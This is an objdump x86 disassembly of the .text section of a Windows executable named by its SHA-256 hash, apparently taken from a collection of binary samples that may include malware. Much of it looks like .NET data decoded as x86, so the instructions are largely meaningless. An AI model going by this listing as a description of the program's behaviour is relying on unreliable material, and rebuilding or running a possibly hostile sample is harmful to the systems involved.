
b092b05340dbdbfd5d9fcaadd255c79cf358b24e2680a4a159b194762fe0b36e.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	rcl    dl,1
  402002:	add    BYTE PTR [eax],al
  402004:	add    BYTE PTR [eax],al
  402006:	add    BYTE PTR [eax],al
  402008:	dec    eax
  402009:	add    BYTE PTR [eax],al
  40200b:	add    BYTE PTR [edx],al
  40200d:	add    BYTE PTR ds:0x581000,al
  402013:	add    BYTE PTR [eax+0x79],bl
  402016:	add    BYTE PTR [eax],al
  402018:	or     eax,DWORD PTR [eax]
  40201a:	add    BYTE PTR [eax],al
  40201c:	add    eax,DWORD PTR [eax]
  40201e:	add    BYTE PTR [esi],al
	...
  402028:	push   eax
  402029:	and    BYTE PTR [eax],al
  40202b:	add    BYTE PTR [eax],al
  40202d:	add    DWORD PTR [eax],eax
	...
  40204f:	add    BYTE PTR [edi],ch
  402051:	test   eax,0x68cd5d19
  402056:	pop    es
  402057:	jns    0x40205e
  402059:	cs stos DWORD PTR es:[edi],eax
  40205b:	add    ebx,DWORD PTR [edi]
  40205d:	ins    DWORD PTR es:[edi],dx
  40205e:	mov    ebx,0xcbe68185
  402063:	add    al,0xe3
  402065:	js     0x4020aa
  402067:	jns    0x4020e2
  402069:	add    al,0x57
  40206b:	jns    0x4020c3
  40206d:	pop    es
  40206e:	mov    dl,bl
  402070:	pop    esp
  402071:	std    
  402072:	aas    
  402073:	xchg   BYTE PTR ds:0x26a8b8e,cl
  402079:	inc    ebp
  40207a:	mov    al,0x56
  40207c:	je     0x402057
  40207e:	lahf   
  40207f:	dec    ecx
  402080:	iret   
  402081:	xchg   esi,eax
  402082:	push   cs
  402083:	call   0xe91c27e2
  402088:	arpl   WORD PTR [ecx-0x768c60ff],sp
  40208e:	push   eax
  40208f:	and    BYTE PTR [ecx-0x55545907],cl
  402095:	inc    esp
  402096:	daa    
  402097:	popa   
  402098:	adc    esi,edx
  40209a:	sbb    al,0x5a
  40209c:	ins    BYTE PTR es:[edi],dx
  40209d:	fadd   DWORD PTR [ebx-0x443b3fa1]
  4020a3:	push   ecx
  4020a4:	jae    0x402086
  4020a6:	(bad)  
  4020a7:	mov    ecx,0xa19b265d
  4020ac:	sbb    dl,bl
  4020ae:	push   esp
  4020af:	sub    DWORD PTR [ebp+edi*4+0x6afcd92d],ebp
  4020b6:	dec    eax
  4020b7:	inc    ebx
  4020b8:	dec    esp
  4020b9:	in     eax,0xcb
  4020bb:	int    0xee
  4020bd:	ss adc al,0x11
  4020c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020c1:	mov    ecx,0x27726fbf
  4020c6:	je     0x402118
  4020c8:	push   eax
  4020c9:	xchg   ebp,eax
  4020ca:	or     DWORD PTR [ebx+0x4eb6d9b7],ebp
  4020d0:	outs   dx,DWORD PTR ds:[esi]
  4020d1:	popf   
  4020d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020d3:	jl     0x402148
  4020d5:	mov    ecx,0x8ecfffb8
  4020da:	aas    
  4020db:	cwde   
  4020dc:	popa   
  4020dd:	aaa    
  4020de:	aas    
  4020df:	cmp    eax,esp
  4020e1:	repnz pop eax
  4020e3:	sbb    al,0xc8
  4020e5:	lock test DWORD PTR ds:0xed5d8f37,ebp
  4020ed:	aas    
  4020ee:	push   0x263e8a7d
  4020f3:	shl    DWORD PTR [eax+0x7a1deb78],0x42
  4020fa:	dec    esp
  4020fb:	sub    dl,BYTE PTR [eax+0x7d]
  4020fe:	scas   eax,DWORD PTR es:[edi]
  4020ff:	js     0x40213d
  402101:	cdq    
  402102:	loope  0x402160
  402104:	cmp    ecx,DWORD PTR ds:0x9927fb7
  40210a:	xor    eax,0x67db96c1
  40210f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402110:	sbb    edx,DWORD PTR [eax-0x1caa70f6]
  402116:	popa   
  402117:	mov    bl,0x56
  402119:	jnp    0x40212e
  40211b:	in     al,dx
  40211c:	push   esp
  40211e:	or     esi,ebp
  402120:	or     BYTE PTR [ebp-0x2f1d2300],dl
  402126:	xchg   edi,eax
  402127:	ficom  WORD PTR [ecx-0x8]
  40212a:	test   ecx,ecx
  40212c:	mov    ah,0x78
  40212e:	mov    ecx,0xef5ace99
  402133:	fist   DWORD PTR [ebp+0x49]
  402136:	xchg   edi,eax
  402137:	xchg   esi,eax
  402138:	jne    0x4020d1
  40213a:	scas   al,BYTE PTR es:[edi]
  40213b:	xchg   ebp,eax
  40213c:	in     eax,0x16
  40213e:	or     edx,eax
  402140:	std    
  402141:	shl    DWORD PTR [edi+edx*2-0xa41c255],0x0
  402149:	inc    edi
  40214a:	rcr    BYTE PTR [ebp+eax*8+0x6e],1
  40214e:	fbstp  TBYTE PTR [edi+0x1a]
  402151:	jle    0x402157
  402153:	add    BYTE PTR [eax],al
  402155:	add    al,0x2a
  402157:	push   ds
  402158:	add    al,BYTE PTR [eax+0x4000004]
  40215e:	sub    dh,BYTE PTR [edx]
  402160:	jle    0x402164
  402162:	add    BYTE PTR [eax],al
  402164:	add    al,0x6f
  402166:	pop    ds
  402167:	add    BYTE PTR [eax],al
  402169:	or     ah,BYTE PTR [esi]
  40216b:	sub    bl,BYTE PTR [ebx]
  40216d:	xor    BYTE PTR [eax+eax*1],al
  402170:	dec    ebp
  402171:	add    al,BYTE PTR [eax]
  402173:	add    BYTE PTR [ecx],al
  402175:	add    BYTE PTR [eax],al
  402177:	adc    DWORD PTR [edx],eax
  402179:	mov    gs,WORD PTR [ecx+0x1c]
  40217c:	xor    al,BYTE PTR [esi]
  40217e:	add    cl,BYTE PTR [esi+0x2311d69]
  402184:	pop    ss
  402185:	sub    al,BYTE PTR [edx]
  402187:	push   ss
  402188:	call   0x1b70:0x172
  40218f:	outs   dx,DWORD PTR ds:[esi]
  402190:	and    BYTE PTR [eax],al
  402192:	add    BYTE PTR [edx],cl
  402194:	sub    al,0x50
  402196:	add    dl,BYTE PTR [edi]
  402198:	call   0x1b70:0x1f72
  40219f:	outs   dx,DWORD PTR ds:[esi]
  4021a0:	and    BYTE PTR [eax],al
  4021a2:	add    BYTE PTR [edx],cl
  4021a4:	sub    al,0x40
  4021a6:	add    bl,BYTE PTR [eax]
  4021a8:	call   0x1b70:0x2f72
  4021af:	outs   dx,DWORD PTR ds:[esi]
  4021b0:	and    BYTE PTR [eax],al
  4021b2:	add    BYTE PTR [edx],cl
  4021b4:	sub    al,0x30
  4021b6:	add    bl,BYTE PTR [ecx]
  4021b8:	call   0x1b70:0x5772
  4021bf:	outs   dx,DWORD PTR ds:[esi]
  4021c0:	and    BYTE PTR [eax],al
  4021c2:	add    BYTE PTR [edx],cl
  4021c4:	sub    al,0x20
  4021c6:	add    bl,BYTE PTR [edx]
  4021c8:	call   0x1b70:0x7972
  4021cf:	outs   dx,DWORD PTR ds:[esi]
  4021d0:	and    BYTE PTR [eax],al
  4021d2:	add    BYTE PTR [edx],cl
  4021d4:	sub    al,0x10
  4021d6:	add    bl,BYTE PTR [ebx]
  4021d8:	call   0x1b70:0x8f72
  4021df:	outs   dx,DWORD PTR ds:[esi]
  4021e0:	and    BYTE PTR [eax],al
  4021e2:	add    BYTE PTR [edx],cl
  4021e4:	sub    eax,0x282a1702
  4021e9:	and    DWORD PTR [eax],eax
  4021eb:	add    BYTE PTR [edx],cl
  4021ed:	add    bl,BYTE PTR [ebx]
  4021ef:	call   0x7e70:0x8f72
  4021f6:	and    al,BYTE PTR [eax]
  4021f8:	add    BYTE PTR [edx],cl
  4021fa:	sub    BYTE PTR [ebx],ah
  4021fc:	add    BYTE PTR [eax],al
  4021fe:	or     ch,BYTE PTR [edi+0x24]
  402201:	add    BYTE PTR [eax],al
  402203:	or     ch,BYTE PTR [eax*1+0x2528]
  40220a:	or     al,BYTE PTR [edx]
  40220c:	mov    gs,WORD PTR [ecx+0x1d]
  40220f:	xor    ah,BYTE PTR [eax+ebp*1]
  402212:	and    DWORD PTR [eax],eax
  402214:	add    BYTE PTR [edx],cl
  402216:	add    bl,BYTE PTR [edx+ebx*4]
  402219:	jb     0x4021cc
  40221b:	add    BYTE PTR [eax],al
  40221d:	jo     0x40229d
  40221f:	and    al,BYTE PTR [eax]
  402221:	add    BYTE PTR [edx],cl
  402223:	sub    BYTE PTR [ebx],ah
  402225:	add    BYTE PTR [eax],al
  402227:	or     ch,BYTE PTR [edi+0x24]
  40222a:	add    BYTE PTR [eax],al
  40222c:	or     ch,BYTE PTR [esi+eax*1]
  40222f:	pop    ss
  402230:	sub    BYTE PTR [edx],al
  402232:	add    BYTE PTR [eax],al
  402234:	push   es
  402235:	sub    BYTE PTR ds:0x16060000,al
  40223b:	jae    0x402263
  40223d:	add    BYTE PTR [eax],al
  40223f:	or     al,BYTE PTR [eax+0x4000002]
  402245:	add    dl,BYTE PTR [esi]
  402247:	call   0x7000:0x17216
  40224e:	outs   dx,DWORD PTR ds:[esi]
  40224f:	daa    
  402250:	add    BYTE PTR [eax],al
  402252:	or     ch,BYTE PTR [edi+0x28]
  402255:	add    BYTE PTR [eax],al
  402257:	or     cl,BYTE PTR [edx]
  402259:	push   es
  40225a:	outs   dx,DWORD PTR ds:[esi]
  40225b:	daa    
  40225c:	add    BYTE PTR [eax],al
  40225e:	or     bl,BYTE PTR [edi]
  402260:	and    al,0x2e
  402262:	add    dl,BYTE PTR [edi]
  402264:	sub    al,BYTE PTR [edx]
  402266:	sbb    BYTE PTR [edx+0x2f7216],bl
  40226c:	add    BYTE PTR [eax+0x6f],dh
  40226f:	daa    
  402270:	add    BYTE PTR [eax],al
  402272:	or     ch,BYTE PTR [edi+0x28]
  402275:	add    BYTE PTR [eax],al
  402277:	or     cl,BYTE PTR [ebx]
  402279:	add    bl,BYTE PTR [ecx]
  40227b:	call   0x7000:0x577216
  402282:	outs   dx,DWORD PTR ds:[esi]
  402283:	daa    
  402284:	add    BYTE PTR [eax],al
  402286:	or     ch,BYTE PTR [edi+0x28]
  402289:	add    BYTE PTR [eax],al
  40228b:	or     cl,BYTE PTR [eax+ecx*1]
  40228e:	outs   dx,DWORD PTR ds:[esi]
  40228f:	daa    
  402290:	add    BYTE PTR [eax],al
  402292:	or     bl,BYTE PTR [edi]
  402294:	and    al,0x2f
  402296:	add    dl,BYTE PTR [edi]
  402298:	sub    al,BYTE PTR [edx]
  40229a:	sbb    bl,BYTE PTR [edx+0x797216]
  4022a0:	add    BYTE PTR [eax+0x6f],dh
  4022a3:	daa    
  4022a4:	add    BYTE PTR [eax],al
  4022a6:	or     ch,BYTE PTR [edi+0x28]
  4022a9:	add    BYTE PTR [eax],al
  4022ab:	or     cl,BYTE PTR ds:0x28090412
  4022b1:	sub    DWORD PTR [eax],eax
  4022b3:	add    BYTE PTR [edx],cl
  4022b5:	jb     0x402284
  4022b7:	add    BYTE PTR [eax],al
  4022b9:	jo     0x4022c1
  4022bb:	sub    BYTE PTR [ebx],ah
  4022bd:	add    BYTE PTR [eax],al
  4022bf:	or     dh,BYTE PTR [ebx+0x2a]
  4022c2:	add    BYTE PTR [eax],al
  4022c4:	or     dl,BYTE PTR [ebx]
  4022c6:	add    eax,0x73041107
  4022cb:	sbb    DWORD PTR [eax],eax
  4022cd:	add    BYTE PTR [esi],al
  4022cf:	adc    eax,DWORD PTR [esi]
  4022d1:	pop    ss
  4022d2:	jae    0x4022ff
  4022d4:	add    BYTE PTR [eax],al
  4022d6:	or     dl,BYTE PTR [ebx]
  4022d8:	pop    es
  4022d9:	adc    DWORD PTR [edi],eax
  4022db:	jle    0x402309
  4022dd:	add    BYTE PTR [eax],al
  4022df:	or     ch,BYTE PTR [edi+0x2d]
  4022e2:	add    BYTE PTR [eax],al
  4022e4:	or     dl,BYTE PTR [ecx]
  4022e6:	pop    es
  4022e7:	and    BYTE PTR [eax],al
  4022e9:	add    BYTE PTR [ebp+0x0],bh
  4022ec:	push   0x6f
  4022ee:	add    BYTE PTR cs:[eax],al
  4022f1:	or     dl,BYTE PTR [ecx]
  4022f3:	pop    es
  4022f4:	outs   dx,DWORD PTR ds:[esi]
  4022f5:	das    
  4022f6:	add    BYTE PTR [eax],al
  4022f8:	or     ah,BYTE PTR [eax]
  4022fa:	add    BYTE PTR [eax],al
  4022fc:	jge    0x4022fe
  4022fe:	outs   dx,DWORD PTR ds:[esi]
  4022ff:	xor    BYTE PTR [eax],al
  402301:	add    BYTE PTR [edx],cl
  402303:	adc    DWORD PTR [edi],eax
  402305:	outs   dx,DWORD PTR ds:[esi]
  402306:	xor    DWORD PTR [eax],eax
  402308:	add    BYTE PTR [edx],cl
  40230a:	outs   dx,DWORD PTR ds:[esi]
  40230b:	xor    al,BYTE PTR [eax]
  40230d:	add    BYTE PTR [edx],cl
  40230f:	sbb    BYTE PTR [edi+0x33],ch
  402312:	add    BYTE PTR [eax],al
  402314:	or     dl,BYTE PTR [ecx]
  402316:	add    eax,0x7110611
  40231b:	sub    BYTE PTR [esi],al
  40231d:	add    BYTE PTR [eax],al
  40231f:	push   es
  402320:	push   ss
  402321:	pop    ss
  402322:	or     BYTE PTR [ebx+0x34],dh
  402325:	add    BYTE PTR [eax],al
  402327:	or     dl,BYTE PTR [ebx]
  402329:	or     BYTE PTR [ecx],dl
  40232b:	or     BYTE PTR [edi+0x1f],ch
  40232e:	add    BYTE PTR [eax],al
  402330:	or     ah,BYTE PTR [esi]
  402332:	adc    DWORD PTR [eax],ecx
  402334:	outs   dx,DWORD PTR ds:[esi]
  402335:	xor    eax,0x20a0000
  40233a:	pop    ss
  40233b:	call   0x7000:0x1f7216
  402342:	outs   dx,DWORD PTR ds:[esi]
  402343:	daa    
  402344:	add    BYTE PTR [eax],al
  402346:	or     ch,BYTE PTR [edi+0x28]
  402349:	add    BYTE PTR [eax],al
  40234b:	or     ch,BYTE PTR [eax]
  40234d:	add    BYTE PTR ss:[eax],al
  402350:	or     ch,BYTE PTR [eax]
  402352:	aaa    
  402353:	add    BYTE PTR [eax],al
  402355:	or     dl,BYTE PTR [ebx]
  402357:	or     DWORD PTR [ecx],edx
  402359:	or     DWORD PTR [eax],ebp
  40235b:	cmp    BYTE PTR [eax],al
  40235d:	add    BYTE PTR [edx],cl
  40235f:	adc    ecx,DWORD PTR [edx]
  402361:	adc    DWORD PTR [edx],ecx
  402363:	sub    al,0x2c
  402365:	adc    DWORD PTR [edx],ecx
  402367:	pop    ss
  402368:	outs   dx,DWORD PTR ds:[esi]
  402369:	cmp    DWORD PTR [eax],eax
  40236b:	add    BYTE PTR [edx],cl
  40236d:	adc    DWORD PTR [edx],ecx
  40236f:	jle    0x402376
  402371:	add    BYTE PTR [eax],al
  402373:	add    al,0x2d
  402375:	adc    DWORD PTR [esi+edi*8],edx
  402378:	push   es
  402379:	or     BYTE PTR [eax],al
  40237b:	add    BYTE PTR [esi],al
  40237d:	jae    0x4023b9
  40237f:	add    BYTE PTR [eax],al
  402381:	or     al,BYTE PTR [eax+0x4000005]
  402387:	jle    0x40238e
  402389:	add    BYTE PTR [eax],al
  40238b:	add    al,0x6f
  40238d:	cmp    eax,DWORD PTR [eax]
  40238f:	add    BYTE PTR [edx],cl
  402391:	jle    0x402395
  402393:	add    BYTE PTR [eax],al
  402395:	add    al,0x6f
  402397:	cmp    al,0x0
  402399:	add    BYTE PTR [edx],cl
  40239b:	sub    BYTE PTR es:[eax+eax*1],al
  40239f:	add    BYTE PTR [esi],al
  4023a1:	fiadd  WORD PTR [ebx]
  4023a3:	fiadd  WORD PTR es:[eax]
  4023a6:	jle    0x4023a9
  4023a8:	add    BYTE PTR [eax],al
  4023aa:	add    al,0x2c
  4023ac:	adc    BYTE PTR [esi+0x1],bh
  4023af:	add    BYTE PTR [eax],al
  4023b1:	add    al,0x6f
  4023b3:	cmp    eax,0x140a0000
  4023b8:	add    BYTE PTR [ecx],0x0
  4023bb:	add    BYTE PTR [esi+edx*1],al
  4023be:	sub    BYTE PTR [esi],bh
  4023c0:	add    BYTE PTR [eax],al
  4023c2:	or     dl,BYTE PTR [esi]
  4023c4:	sub    al,BYTE PTR [eax]
  4023c6:	add    BYTE PTR [eax],al
  4023c8:	add    DWORD PTR [eax],edx
  4023ca:	add    BYTE PTR [eax],al
  4023cc:	add    BYTE PTR [eax],al
  4023ce:	rol    DWORD PTR [ecx],0x6a
  4023d1:	sub    eax,DWORD PTR [edx]
  4023d3:	add    esi,DWORD PTR [esi]
  4023d5:	add    BYTE PTR [eax],al
  4023d7:	add    DWORD PTR [ebx],ebx
  4023d9:	xor    BYTE PTR [ebx],al
  4023db:	add    BYTE PTR [edx+0x0],bl
  4023de:	add    BYTE PTR [eax],al
  4023e0:	add    eax,DWORD PTR [eax]
  4023e2:	add    BYTE PTR [ecx],dl
  4023e4:	jle    0x402425
  4023e6:	add    BYTE PTR [eax],al
  4023e8:	or     dh,BYTE PTR [edx-0x7]
  4023eb:	add    BYTE PTR [eax],al
  4023ed:	jo     0x402405
  4023ef:	outs   dx,DWORD PTR ds:[esi]
  4023f0:	inc    eax
  4023f1:	add    BYTE PTR [eax],al
  4023f3:	or     cl,BYTE PTR [edx]
  4023f5:	push   es
  4023f6:	sub    al,0x39
  4023f8:	push   es
  4023f9:	jb     0x402452
  4023fb:	add    DWORD PTR [eax],eax
  4023fd:	jo     0x40246e
  4023ff:	inc    ecx
  402400:	add    BYTE PTR [eax],al
  402402:	or     cl,BYTE PTR [ebx]
  402404:	pop    es
  402405:	adc    al,0xfe
  402407:	add    DWORD PTR [esi],edx
  402409:	inc    BYTE PTR [ecx]
  40240b:	pop    es
  40240c:	jne    0x40248c
  40240e:	add    BYTE PTR [eax],al
  402410:	add    DWORD PTR [esi+edi*8],edx
  402413:	add    ebx,DWORD PTR [edi+0x2c]
  402416:	sbb    al,BYTE PTR [edi]
  402418:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402419:	jle    0x40241b
  40241b:	add    BYTE PTR [ecx],al
  40241d:	push   ss
  40241e:	xor    DWORD PTR [ecx],edx
  402420:	pop    es
  402421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402422:	jle    0x402424
  402424:	add    BYTE PTR [ecx],al
  402426:	and    al,ch
  402428:	add    eax,DWORD PTR [eax]
  40242a:	add    BYTE PTR [edx+0x28],bl
  40242d:	inc    edx
  40242e:	add    BYTE PTR [eax],al
  402430:	or     bl,dh
  402432:	or     al,BYTE PTR [esi]
  402434:	sub    al,0x6
  402436:	push   es
  402437:	outs   dx,DWORD PTR ds:[esi]
  402438:	inc    ebx
  402439:	add    BYTE PTR [eax],al
  40243b:	or     bl,ah
  40243d:	sub    al,BYTE PTR [eax]
  40243f:	add    BYTE PTR [ecx],al
  402441:	adc    BYTE PTR [eax],al
  402443:	add    BYTE PTR [edx],al
  402445:	add    BYTE PTR [ecx],dl
  402447:	add    BYTE PTR [esi],bh
  402449:	dec    edi
  40244a:	add    BYTE PTR [edx],cl
  40244c:	add    BYTE PTR [eax],al
  40244e:	add    BYTE PTR [eax],al
  402450:	adc    esi,DWORD PTR [eax]
  402452:	add    al,BYTE PTR [eax]
  402454:	push   ss
  402455:	add    BYTE PTR [eax],al
  402457:	add    BYTE PTR [eax+eax*1],al
  40245a:	add    BYTE PTR [ecx],dl
  40245c:	adc    al,BYTE PTR [eax]
  40245e:	adc    al,BYTE PTR [ecx]
  402460:	sub    BYTE PTR [eax+eax*1+0x0],al
  402464:	or     al,BYTE PTR [edi]
  402466:	sbb    BYTE PTR [edi],ch
  402468:	or     BYTE PTR [esi],al
  40246a:	sbb    BYTE PTR [eax],ch
  40246c:	inc    ebp
  40246d:	add    BYTE PTR [eax],al
  40246f:	or     ah,BYTE PTR [esi]
  402471:	sub    al,BYTE PTR [eax]
  402473:	add    BYTE PTR [ebx],dl
  402475:	xor    BYTE PTR [eax+eax*1],al
  402478:	enter  0x0,0x0
  40247c:	add    eax,0xd0110000
  402481:	adc    BYTE PTR [eax],al
  402483:	add    BYTE PTR [edx],al
  402485:	sub    BYTE PTR [esi+0x0],al
  402488:	add    BYTE PTR [edx],cl
  40248a:	pop    ss
  40248b:	lea    ebx,[ecx]
  40248d:	add    BYTE PTR [eax],al
  40248f:	add    DWORD PTR [ebx],edx
  402491:	add    al,0x11
  402493:	add    al,0x16
  402495:	add    ah,BYTE PTR [edx+0x47730411]
  40249b:	add    BYTE PTR [eax],al
  40249d:	or     al,BYTE PTR [eax+0x4000001]
  4024a3:	jle    0x4024a6
  4024a5:	add    BYTE PTR [eax],al
  4024a7:	add    al,0x6f
  4024a9:	dec    eax
  4024aa:	add    BYTE PTR [eax],al
  4024ac:	or     al,BYTE PTR [ebx]
  4024ae:	outs   dx,DWORD PTR ds:[esi]
  4024af:	dec    ecx
  4024b0:	add    BYTE PTR [eax],al
  4024b2:	or     bh,BYTE PTR [esi+0x1]
  4024b5:	add    BYTE PTR [eax],al
  4024b7:	add    al,0xd0
  4024b9:	adc    eax,DWORD PTR [eax]
  4024bb:	add    BYTE PTR [ecx],al
  4024bd:	sub    BYTE PTR [esi+0x0],al
  4024c0:	add    BYTE PTR [edx],cl
  4024c2:	outs   dx,DWORD PTR ds:[esi]
  4024c3:	dec    edx
  4024c4:	add    BYTE PTR [eax],al
  4024c6:	or     al,BYTE PTR [edx+esi*2]
  4024c9:	add    DWORD PTR [ecx],0x4b6f7000
  4024cf:	add    BYTE PTR [eax],al
  4024d1:	or     cl,BYTE PTR [edx]
  4024d3:	push   es
  4024d4:	outs   dx,DWORD PTR ds:[esi]
  4024d5:	dec    esp
  4024d6:	add    BYTE PTR [eax],al
  4024d8:	or     bh,BYTE PTR [esi+0x2]
  4024db:	add    BYTE PTR [eax],al
  4024dd:	add    al,0x73
  4024df:	or     al,BYTE PTR [eax]
  4024e1:	add    BYTE PTR [esi],al
  4024e3:	outs   dx,DWORD PTR ds:[esi]
  4024e4:	dec    ebp
  4024e5:	add    BYTE PTR [eax],al
  4024e7:	or     al,BYTE PTR [esi]
  4024e9:	outs   dx,DWORD PTR ds:[esi]
  4024ea:	dec    esp
  4024eb:	add    BYTE PTR [eax],al
  4024ed:	or     dh,BYTE PTR [ebx+0x18]
  4024f0:	add    BYTE PTR [eax],al
  4024f2:	push   es
  4024f3:	outs   dx,DWORD PTR ds:[esi]
  4024f4:	dec    ebp
  4024f5:	add    BYTE PTR [eax],al
  4024f7:	or     al,BYTE PTR [esi]
  4024f9:	outs   dx,DWORD PTR ds:[esi]
  4024fa:	dec    esi
  4024fb:	add    BYTE PTR [eax],al
  4024fd:	or     cl,BYTE PTR [ebx]
  4024ff:	pop    es
  402500:	outs   dx,DWORD PTR ds:[esi]
  402501:	dec    edi
  402502:	add    BYTE PTR [eax],al
  402504:	or     dh,BYTE PTR [edx-0x57]
  402507:	add    DWORD PTR [eax],eax
  402509:	jo     0x40257a
  40250b:	push   eax
  40250c:	add    BYTE PTR [eax],al
  40250e:	or     cl,BYTE PTR [eax+ecx*1]
  402511:	outs   dx,DWORD PTR ds:[esi]
  402512:	push   ecx
  402513:	add    BYTE PTR [eax],al
  402515:	or     ch,BYTE PTR [edi+0x1]
  402518:	add    BYTE PTR [eax],al
  40251a:	sub    ecx,DWORD PTR ds:0x8132d09
  402520:	jae    0x402575
  402522:	add    BYTE PTR [eax],al
  402524:	or     cl,BYTE PTR ds:0x516f08
  40252a:	add    BYTE PTR [edx],cl
  40252c:	or     DWORD PTR [edi+0x54],ebp
  40252f:	add    BYTE PTR [eax],al
  402531:	or     cl,BYTE PTR [ecx]
  402533:	jae    0x40258a
  402535:	add    BYTE PTR [eax],al
  402537:	or     ch,BYTE PTR [edi+0x56]
  40253a:	add    BYTE PTR [eax],al
  40253c:	or     bh,BYTE PTR [esi+0x1]
  40253f:	add    BYTE PTR [eax],al
  402541:	add    al,0x6f
  402543:	push   edi
  402544:	add    BYTE PTR [eax],al
  402546:	or     ch,BYTE PTR [edx]
  402548:	cs jae 0x4025a3
  40254b:	add    BYTE PTR [eax],al
  40254d:	or     al,BYTE PTR [eax+0x4000003]
  402553:	sub    bl,BYTE PTR [esi]
  402555:	add    ch,BYTE PTR [eax]
  402557:	pop    eax
  402558:	add    BYTE PTR [eax],al
  40255a:	or     ch,BYTE PTR [edx]
  40255c:	cmp    al,BYTE PTR [edx]
  40255e:	sub    BYTE PTR [eax+0x0],bl
  402561:	add    BYTE PTR [edx],cl
  402563:	add    al,BYTE PTR [ebx]
  402565:	jge    0x40256d
  402567:	add    BYTE PTR [eax],al
  402569:	add    al,0x2a
  40256b:	sbb    dh,BYTE PTR [ebx+0x75]
  40256e:	add    BYTE PTR [eax],al
  402570:	push   es
  402571:	sub    bl,BYTE PTR [edx]
  402573:	jae    0x4025ea
  402575:	add    BYTE PTR [eax],al
  402577:	push   es
  402578:	sub    al,BYTE PTR [eax]
  40257a:	add    BYTE PTR [eax],al
  40257c:	adc    esi,DWORD PTR [eax]
  40257e:	add    DWORD PTR [eax],eax
  402580:	daa    
  402581:	add    BYTE PTR [eax],al
  402583:	add    BYTE PTR [esi],al
  402585:	add    BYTE PTR [eax],al
  402587:	adc    DWORD PTR [esi*2+0x2000010],eax
  40258e:	or     al,BYTE PTR [esi]
  402590:	sub    al,0x1c
  402592:	push   es
  402593:	outs   dx,DWORD PTR ds:[esi]
  402594:	jae    0x402596
  402596:	add    BYTE PTR [esi],al
  402598:	or     eax,DWORD PTR [esi]
  40259a:	outs   dx,DWORD PTR ds:[esi]
  40259b:	ja     0x40259d
  40259d:	add    BYTE PTR [esi],al
  40259f:	pop    es
  4025a0:	sub    al,0xc
  4025a2:	add    bh,BYTE PTR [ebx+0x6]
  4025a5:	add    BYTE PTR [eax],al
  4025a7:	add    al,0x6f
  4025a9:	pop    ds
  4025aa:	add    BYTE PTR [eax],al
  4025ac:	or     ah,BYTE PTR [esi]
  4025ae:	sub    al,BYTE PTR [esi]
  4025b0:	sub    al,BYTE PTR [esi]
  4025b2:	sub    dh,BYTE PTR [esi]
  4025b4:	add    al,0x6f
  4025b6:	pop    ecx
  4025b7:	add    BYTE PTR [eax],al
  4025b9:	or     al,BYTE PTR [edx]
  4025bb:	outs   dx,DWORD PTR ds:[esi]
  4025bc:	pop    edx
  4025bd:	add    BYTE PTR [eax],al
  4025bf:	or     ch,BYTE PTR [edx]
  4025c1:	push   es
  4025c2:	sub    cl,BYTE PTR [edx+0x4]
  4025c5:	outs   dx,DWORD PTR ds:[esi]
  4025c6:	pop    ecx
  4025c7:	add    BYTE PTR [eax],al
  4025c9:	or     ch,BYTE PTR [edi+0x5b]
  4025cc:	add    BYTE PTR [eax],al
  4025ce:	or     al,BYTE PTR [edx]
  4025d0:	outs   dx,DWORD PTR ds:[esi]
  4025d1:	pop    esp
  4025d2:	add    BYTE PTR [eax],al
  4025d4:	or     ch,BYTE PTR [edx]
  4025d6:	add    BYTE PTR [eax],al
  4025d8:	adc    esi,DWORD PTR [eax]
  4025da:	add    eax,DWORD PTR [eax]
  4025dc:	jb     0x4025de
  4025de:	add    BYTE PTR [eax],al
  4025e0:	pop    es
  4025e1:	add    BYTE PTR [eax],al
  4025e3:	adc    DWORD PTR [ebx],eax
  4025e5:	push   eax
  4025e6:	outs   dx,DWORD PTR ds:[esi]
  4025e7:	pop    ebp
  4025e8:	add    BYTE PTR [eax],al
  4025ea:	or     cl,BYTE PTR [edx]
  4025ec:	push   es
  4025ed:	jb     0x4025b8
  4025ef:	add    DWORD PTR [eax],eax
  4025f1:	jo     0x402665
  4025f3:	out    0x1,eax
  4025f5:	add    BYTE PTR [eax+0x6f],dh
  4025f8:	pop    esi
  4025f9:	add    BYTE PTR [eax],al
  4025fb:	or     dl,BYTE PTR ds:0x7206212e
  402601:	leave  
  402602:	add    DWORD PTR [eax],eax
  402604:	jo     0x402678
  402606:	out    0x1,eax
  402608:	add    BYTE PTR [eax+0x6f],dh
  40260b:	add    al,BYTE PTR [eax]
  40260d:	add    BYTE PTR [ebx],ch
  40260f:	or     ebp,DWORD PTR [eax]
  402611:	pusha  
  402612:	add    BYTE PTR [eax],al
  402614:	or     al,BYTE PTR [edi]
  402616:	sub    BYTE PTR [ecx+0x0],ah
  402619:	add    BYTE PTR [edx],cl
  40261b:	outs   dx,DWORD PTR ds:[esi]
  40261c:	bound  eax,QWORD PTR [eax]
  40261e:	add    BYTE PTR [edx],cl
  402620:	push   es
  402621:	jb     0x4025a5
  402623:	add    al,BYTE PTR [eax]
  402625:	jo     0x402699
  402627:	out    0x1,eax
  402629:	add    BYTE PTR [eax+0x6f],dh
  40262c:	pop    esi
  40262d:	add    BYTE PTR [eax],al
  40262f:	or     dl,BYTE PTR ds:0x7206212e
  402635:	add    BYTE PTR [edx],0x0
  402638:	jo     0x4026ac
  40263a:	out    0x1,eax
  40263c:	add    BYTE PTR [eax+0x6f],dh
  40263f:	add    al,BYTE PTR [eax]
  402641:	add    BYTE PTR [ebx],ch
  402643:	or     al,0x28
  402645:	pusha  
  402646:	add    BYTE PTR [eax],al
  402648:	or     cl,BYTE PTR [eax]
  40264a:	sub    BYTE PTR [ecx+0x0],ah
  40264d:	add    BYTE PTR [edx],cl
  40264f:	outs   dx,DWORD PTR ds:[esi]
  402650:	arpl   WORD PTR [eax],ax
  402652:	add    BYTE PTR [edx],cl
  402654:	adc    al,0x2a
  402656:	push   es
  402657:	sub    al,BYTE PTR [esi]
  402659:	sub    al,BYTE PTR [esi]
  40265b:	sub    al,BYTE PTR [esi]
  40265d:	sub    bl,BYTE PTR [esi]
  40265f:	add    ch,BYTE PTR [eax]
  402661:	pop    eax
  402662:	add    BYTE PTR [eax],al
  402664:	or     ch,BYTE PTR [edx]
  402666:	push   0x2
  402668:	sub    BYTE PTR [eax+eax*1+0x0],ah
  40266c:	or     al,BYTE PTR [edx]
